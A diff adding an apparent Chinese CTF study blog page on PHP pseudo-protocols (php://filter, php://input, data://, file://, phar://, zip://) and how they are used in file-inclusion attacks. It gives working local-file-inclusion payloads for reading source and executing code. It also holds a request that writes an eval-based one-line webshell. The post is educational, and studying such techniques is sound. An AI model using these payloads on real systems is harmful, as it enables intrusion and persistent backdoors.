@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="PHP.ini在php.ini里有两个重要的参数allow_url_fopen和allow_url_includeallow_url_fopen:默认值是ON，允许url里的封装协议访问文件allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文件 php:&#x2F;&#x2F;filter经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP伪协议">
+<meta property="og:url" content="http://example.com/2021/02/27/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
+<meta property="og:site_name" content="榉橡的博客">
+<meta property="og:description" content="PHP.ini在php.ini里有两个重要的参数allow_url_fopen和allow_url_includeallow_url_fopen:默认值是ON，允许url里的封装协议访问文件allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文件 php:&#x2F;&#x2F;filter经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBh">
+<meta property="og:image" content="https://segmentfault.com/img/bVbrQBi">
+<meta property="article:published_time" content="2021-02-27T11:56:54.000Z">
+<meta property="article:modified_time" content="2021-03-02T01:22:40.746Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://segmentfault.com/img/bVbrQBh">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/02/27/PHP伪协议/"/>
+
+
+
+
+
+  <title>PHP伪协议 | 榉橡的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">榉橡的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/27/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="榉橡的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHP伪协议</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-27T19:56:54+08:00">
+                2021-02-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="PHP-ini"><a href="#PHP-ini" class="headerlink" title="PHP.ini"></a>PHP.ini</h2><p>在php.ini里有两个重要的参数allow_url_fopen和allow_url_include<br>allow_url_fopen:默认值是ON，允许url里的封装协议访问文件<br>allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文件</p>
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.<br>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。<br>php://filter参数<br>名称    描述<br>resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。<br>read=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔<br>write=&lt;写链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔<br>&lt;；两个链的筛选列表&gt;     任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</p>
+<p><strong>php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx</strong></p>
+<p>filter和string过滤器连用可以对字符串进行过滤。filter的read和write参数有不同的应用场景。read用于include()和file_get_contents(),write用于file_put_contents()中。</p>
+<p><strong>php://filter/convert.base64-encode/resource=xxx</strong>针对php文件需要base64编码</p>
+<p><strong>php://filter/convert.base64-decode/resource=xxx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php</span><br></pre></td></tr></table></figure>
+<p>这是使用的过滤器是convert.base64-encode.它的作用就是读取upload.php的内容进行base64编码后输出。可以用于读取程序源代码经过base64编码后的数据</p>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
+<p>需要开启allow_url_include</p>
+<p>注：<strong>当enctype=”multipart/form-data”时，php://input是无效的</strong>。</p>
+<p><strong>php://input + [POST DATA]`执行php代码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://segmentfault.com/img/bVbrQBh" alt="图片描述"></p>
+<h4 id="若有写入权限，写入一句话木马"><a href="#若有写入权限，写入一句话木马" class="headerlink" title="若有写入权限，写入一句话木马"></a>若有写入权限，写入一句话木马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://segmentfault.com/img/bVbrQBi" alt="图片描述"></p>
+<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><p>​    用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。<br>​    file://伪协议在双OFF的时候也可以用，用于本地文件包含<br>​    <strong>1</strong>.file://[文件的绝对路径和文件名</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure>
+<p>​    <strong>2</strong>.[文件的相对路径和文件名]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;.&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
+<p>​    <strong>3</strong>.[http：//网络路径和文件名]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>PHP 归档，常常跟文件包含，文件上传结合着考察。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。<br>phar://test.[zip/jpg/png…]/file.txt<br>其实可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为phar://test.test/file.txt也可以运行。</p>
+<h2 id="zip-bzip2-zlib"><a href="#zip-bzip2-zlib" class="headerlink" title="zip://,bzip2://, zlib://"></a>zip://,bzip2://, zlib://</h2><p>​    在双OFF的时候也可以用，<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。<br>​    zip://test.zip%23file.txt<br>​    和phar://一样用于读取压缩文件，绝对路径。不过对于”zip://test.zip#file.txt”中的”#”要编码为”%23”.因为url的#后的内容不会被传送</p>
+<ul>
+<li><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> 协议</h2><ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><code>allow_url_fopen</code>:on</li>
+<li><code>allow_url_include</code> :on</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
+</li>
+<li><p><strong>用法</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>示例</strong>：</p>
+<ol>
+<li>`data://text/plain,</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>​          2.data://text/plain;base64，</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php？file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/82461043">https://blog.csdn.net/nzjdsds/article/details/82461043</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/26/IP%E4%BC%AA%E9%80%A0/" rel="next" title="IP伪造">
+                <i class="fa fa-chevron-left"></i> IP伪造
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/03/02/RSA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="RSA学习笔记">
+                RSA学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-ini"><span class="nav-number">1.</span> <span class="nav-text">PHP.ini</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-filter"><span class="nav-number">2.</span> <span class="nav-text">php:&#x2F;&#x2F;filter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-input"><span class="nav-number">3.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8B%A5%E6%9C%89%E5%86%99%E5%85%A5%E6%9D%83%E9%99%90%EF%BC%8C%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">3.0.1.</span> <span class="nav-text">若有写入权限，写入一句话木马</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#file"><span class="nav-number">4.</span> <span class="nav-text">file:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar"><span class="nav-number">5.</span> <span class="nav-text">phar:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zip-bzip2-zlib"><span class="nav-number">6.</span> <span class="nav-text">zip:&#x2F;&#x2F;,bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#data-%E5%8D%8F%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">data:&#x2F;&#x2F; 协议</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+<--
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
